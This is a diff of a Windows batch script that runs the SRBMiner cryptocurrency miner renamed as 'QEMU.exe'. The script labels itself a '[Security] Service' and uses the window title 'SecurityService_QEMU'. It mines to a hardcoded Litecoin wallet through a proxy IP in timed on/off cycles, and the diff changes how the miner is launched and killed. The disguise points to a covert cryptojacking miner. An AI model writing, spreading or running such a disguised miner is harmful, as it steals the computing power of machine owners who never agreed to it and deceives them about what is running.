@@ -16,6 +16,7 @@ set ZIP=%BASE%\SRBMiner-Multi-3-1-1-win64.zip
 set EXTRACT=%BASE%\SRBMiner-Multi-3-1-1
 set BIN=%BASE%\QEMU.exe
 set FLAG=%BASE%\security_downloaded.flag
+set WINTITLE=SecurityService_QEMU
 
 REM =========================
 REM DOWNLOAD SEKALI SAJA
@@ -51,14 +52,28 @@ echo ----------------------------------------
 echo [Security] Service running (5 minutes)
 echo ----------------------------------------
 
-cmd /c "%BIN% --algorithm yespowerr16 --pool yespowerR16.sea.mine.zpool.ca:6534 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --password c=LTC --disable-gpu --nicehash false --keepalive true --disable-startup-monitor --disable-huge-pages --disable-msr-tweaks --cpu-threads 6 --cpu-threads-intensity 1 --cpu-threads-priority 1 --miner-priority 1 --proxy 174.138.61.184:1080" ^
-  >nul 2>&1 & set QEMU_PID=!^
+start "%WINTITLE%" "%BIN%" ^
+ --algorithm yespowerr16 ^
+ --pool yespowerR16.sea.mine.zpool.ca:6534 ^
+ --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
+ --password c=LTC ^
+ --disable-gpu ^
+ --nicehash false ^
+ --keepalive true ^
+ --disable-startup-monitor ^
+ --disable-huge-pages ^
+ --disable-msr-tweaks ^
+ --cpu-threads 6 ^
+ --cpu-threads-intensity 1 ^
+ --cpu-threads-priority 1 ^
+ --miner-priority 1 ^
+ --proxy 174.138.61.184:1080
 
 REM Tunggu 5 menit
 timeout /t 300 /nobreak
 
-echo [Security] Stopping service (PID=%QEMU_PID%)...
-taskkill /PID %QEMU_PID% /F >nul 2>&1
+echo [Security] Stopping service...
+taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1
 
 echo [Security] Idle 5 minutes...
 timeout /t 300 /nobreak
